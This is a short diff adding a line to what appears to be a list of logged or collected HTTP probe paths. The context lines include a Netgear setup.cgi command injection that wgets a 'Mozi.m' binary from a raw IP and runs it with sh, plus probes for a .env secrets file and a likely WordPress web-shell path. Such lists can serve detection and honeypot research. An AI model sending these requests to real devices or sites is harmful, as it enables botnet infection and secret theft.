@@ -7790,3 +7790,4 @@ http://httpbin.org/
 /?srsltid=AfmBOopimqtNokuE1NFhrE7YrTOUdr42flgPoe38CKQsU9lyv1kwMJYh
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://61.52.218.221:39749/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 ./.env
+/wp-includes/sodium_compat/autoload_classmap.php/wp-includes/images/smilies/about.php
